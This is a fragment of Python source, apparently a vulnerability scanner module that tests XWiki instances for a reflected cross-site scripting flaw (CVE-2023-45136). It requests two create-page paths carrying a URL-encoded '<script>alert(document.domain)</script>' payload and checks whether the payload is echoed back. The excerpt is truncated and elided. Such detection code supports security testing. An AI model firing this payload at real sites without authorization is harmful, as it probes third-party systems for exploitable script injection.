...
class Module(Scanner, Http_client):
    __info__ = {
        ...
        'references': ['https://jira.xwiki.org/browse/XWIKI-20854', 'https://nvd.nist.gov/vuln/detail/CVE-2023-45136'],
        'cve': 'CVE-2023-45136',
    }

    def run(self):
        for path in ('/bin/create/Main/%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E', '/xwiki/bin/create/Main/%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_all = ('<script>alert(document.domain)</script>', 'data-xwiki-reference',)
